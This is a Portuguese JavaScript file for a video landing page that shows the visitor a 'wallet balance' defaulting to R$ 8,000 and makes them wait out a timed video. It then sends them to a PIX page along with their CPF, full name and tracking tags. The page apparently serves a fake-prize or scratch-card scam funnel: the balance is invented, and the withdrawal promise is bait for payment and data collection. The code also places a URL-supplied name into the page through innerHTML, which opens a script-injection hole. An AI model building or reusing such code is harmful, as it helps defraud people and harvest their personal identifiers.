// Estado do usuário
let estadoUsuario = {
    nome: '',
    cpf: '',
    saldo: 0,
    utms: {}
};

// Controle do timer
let tempoTotal = 329; // 5 minutos e 29 segundos em segundos
let tempoRestante = tempoTotal;
let timerInterval = null;
let tempoAssistido = 0;

// Elementos DOM
let elementos = {};

// Inicializar
document.addEventListener('DOMContentLoaded', function() {
    console.log('Página VSL carregada');
    
    // Inicializar elementos DOM
    inicializarElementos();
    
    // Carregar dados do usuário
    carregarDadosUsuario();
    
    // Carregar UTMs
    carregarUTMs();
    
    // Atualizar interface
    atualizarInterface();
    
    // Iniciar o timer
    iniciarTimer();
    
    console.log('Página inicializada com sucesso');
});

function inicializarElementos() {
    elementos = {
        saldoCarteira: document.getElementById('saldoCarteira'),
        nomeUsuario: document.getElementById('nomeUser'),
        botaoContainer: document.getElementById('botaoContainer'),
        botaoLiberar: document.getElementById('botaoLiberar'),
        statusMensagem: document.getElementById('statusMensagem'),
        logoHeader: document.getElementById('logoHeader')
    };
    
    // Configurar evento do botão
    if (elementos.botaoLiberar) {
        elementos.botaoLiberar.addEventListener('click', liberarSaque);
    }
    
    // Configurar logo padrão se não existir
    if (elementos.logoHeader && !elementos.logoHeader.src) {
        elementos.logoHeader.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjMwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNmZmYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIiBmaWxsPSIjMGI2N2IzIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjNlbSI+UkFTUEFESU5IQTwvdGV4dD48L3N2Zz4=';
    }
}

function carregarDadosUsuario() {
    try {
        const urlParams = new URLSearchParams(window.location.search);
        
        let fromLocal = {};
        try { fromLocal = JSON.parse(localStorage.getItem('usuario_dados') || '{}'); } catch(e){}
        
        let estadoJogo = {};
        try { estadoJogo = JSON.parse(localStorage.getItem('estado_jogo') || '{}'); } catch(e){}

        // Prioridade: URL > usuario_dados > cpf_usuario / nome_usuario
        estadoUsuario.nome = urlParams.get('nome') || fromLocal.nome || fromLocal.NOME || localStorage.getItem('nome_usuario') || 'Usuário';
        estadoUsuario.cpf = urlParams.get('cpf') || fromLocal.cpf || fromLocal.CPF || localStorage.getItem('cpf_usuario') || '';
        estadoUsuario.saldo = parseInt(urlParams.get('premio')) || estadoJogo.saldo || fromLocal.saldo || 8000;
        
        // Formatar nome para mostrar apenas primeiro nome no UI (mas manter completo em estadoUsuario.nome se necessário)
        const primeiroNome = estadoUsuario.nome.split(' ')[0];
        estadoUsuario.primeiroNome = primeiroNome;
        
    } catch (e) {
        console.log('Erro ao carregar dados do usuário:', e);
    }
}

function carregarUTMs() {
    try {
        const urlParams = new URLSearchParams(window.location.search);
        const utmParams = [
            'utm_source',
            'utm_medium', 
            'utm_campaign',
            'utm_term',
            'utm_content'
        ];
        
        let utmsEncontradas = {};
        let temUtmUrl = false;

        utmParams.forEach(utm => {
            const valor = urlParams.get(utm);
            if (valor) {
                utmsEncontradas[utm] = valor;
                temUtmUrl = true;
            }
        });

        // ✅ SE VEIO DA URL → SALVA
        if (temUtmUrl) {
            estadoUsuario.utms = utmsEncontradas;
            localStorage.setItem('utm_params', JSON.stringify(utmsEncontradas));
        } 
        // 🔄 SENÃO → CARREGA DO STORAGE
        else {
            const utmsSalvas = localStorage.getItem('utm_params');
            if (utmsSalvas) {
                estadoUsuario.utms = JSON.parse(utmsSalvas);
            }
        }

    } catch (e) {
        console.log('Erro ao carregar UTMs:', e);
    }
}
function atualizarInterface() {
    console.log('Atualizando interface com:', estadoUsuario);
    
    // Atualizar saldo
    if (elementos.saldoCarteira) {
        elementos.saldoCarteira.textContent = `R$ ${estadoUsuario.saldo.toLocaleString()},00`;
    }
    
    // Atualizar nome no header
    if (elementos.nomeUsuario) {
        const nomeExibir = estadoUsuario.primeiroNome || 'Usuário';
        const nomeHTML = `
            <svg fill="#000000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/>
            </svg>
            ${nomeExibir}
        `;
        elementos.nomeUsuario.innerHTML = nomeHTML;
    }
}

function iniciarTimer() {
    console.log('Iniciando timer de 5:29 minutos');
    
    // Atualizar mensagem inicial
    if (elementos.statusMensagem) {
        elementos.statusMensagem.textContent = "Aguarde o vídeo terminar para liberar seu saque...";
    }
    
    // Iniciar contagem regressiva
    timerInterval = setInterval(() => {
        tempoRestante--;
        tempoAssistido++;
        
        // Verificar se o tempo acabou
        if (tempoRestante <= 0) {
            finalizarTimer();
        }
        
        // Atualizar mensagem conforme tempo passa
        if (elementos.statusMensagem) {
            if (tempoRestante === 120) {
                elementos.statusMensagem.textContent = "Continue assistindo, você está na metade do caminho!";
            } else if (tempoRestante === 60) {
                elementos.statusMensagem.textContent = "Faltam apenas 1 minuto! Quase lá...";
            } else if (tempoRestante <= 30) {
                elementos.statusMensagem.textContent = "Finalizando... Prepare-se para liberar seu saque!";
            }
        }
    }, 1000);
}

function finalizarTimer() {
    console.log('Timer finalizado após', tempoAssistido, 'segundos');
    
    // Parar o timer
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
    
    // Mostrar botão
    if (elementos.botaoContainer) {
        elementos.botaoContainer.style.display = 'block';

        // ⬇️ ROLAGEM AUTOMÁTICA ATÉ O BOTÃO
        setTimeout(() => {
            elementos.botaoContainer.scrollIntoView({
                behavior: 'smooth',
                block: 'center'
            });
        }, 300);
    }
    
    // Atualizar mensagem
    if (elementos.statusMensagem) {
        elementos.statusMensagem.textContent =
          "Vídeo assistido com sucesso! Clique no botão abaixo para liberar seu saque.";
        elementos.statusMensagem.style.color = "#2ccb74";
        elementos.statusMensagem.style.fontWeight = "600";
    }
}

function liberarSaque() {
    console.log('Liberando saque...');
    
    // Desabilitar botão para evitar múltiplos cliques
    if (elementos.botaoLiberar) {
        elementos.botaoLiberar.disabled = true;
        elementos.botaoLiberar.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECIONANDO...';
        elementos.botaoLiberar.classList.remove('pulse');
    }
    
    // Atualizar mensagem
    if (elementos.statusMensagem) {
        elementos.statusMensagem.textContent = "Redirecionando para o chat de suporte...";
    }
    
    // Construir URL com todos os parâmetros
    const url = construirURLRedirecionamento();
    
    console.log('Redirecionando para:', url);
    
    // Redirecionar após pequeno delay
    setTimeout(() => {
        window.location.href = url;
    }, 800);
}

function construirURLRedirecionamento() {
    // Buscar nome completo (não apenas primeiro nome)
    let nomeCompleto = '';
    try {
        const dadosSalvos = localStorage.getItem('usuario_dados');
        if (dadosSalvos) {
            const dados = JSON.parse(dadosSalvos);
            nomeCompleto = dados.nome || estadoUsuario.nome;
        } else {
            // Tentar da URL
            const urlParams = new URLSearchParams(window.location.search);
            nomeCompleto = urlParams.get('nome') || estadoUsuario.nome;
        }
    } catch (e) {
        nomeCompleto = estadoUsuario.nome;
    }
    
    // Lista de UTMs que precisamos enviar
    const utmParams = [
        'utm_source',
        'utm_medium', 
        'utm_campaign',
        'utm_term',
        'utm_content'
    ];
    
    const params = new URLSearchParams();
    
    // Adicionar UTMs - se não tiver, usar 'direct'
    utmParams.forEach(utm => {
        if (estadoUsuario.utms[utm]) {
            params.append(utm, estadoUsuario.utms[utm]);
        } else {
            params.append(utm, 'direct');
        }
    });
    
    // Adicionar dados do usuário
    if (estadoUsuario.cpf) {
        params.append('cpf', estadoUsuario.cpf);
    }
    
    if (nomeCompleto) {
        params.append('nome', nomeCompleto);
    }
    
    params.append('premio', estadoUsuario.saldo.toString());
    params.append('tempo_assistido', tempoAssistido.toString());
    
    return `../pix/index.html?${params.toString()}`;
}

// Função para pular timer (apenas para testes - remover em produção)
function pularTimerTeste() {
    console.log('Pulando timer (modo teste)');
    tempoRestante = 5;
    if (elementos.statusMensagem) {
        elementos.statusMensagem.textContent = "Modo teste ativado - Timer acelerado!";
        elementos.statusMensagem.style.color = "#F7A600";
    }
}

// Expor funções para console (apenas para desenvolvimento)
window.pularTimerTeste = pularTimerTeste;
window.estadoUsuario = estadoUsuario;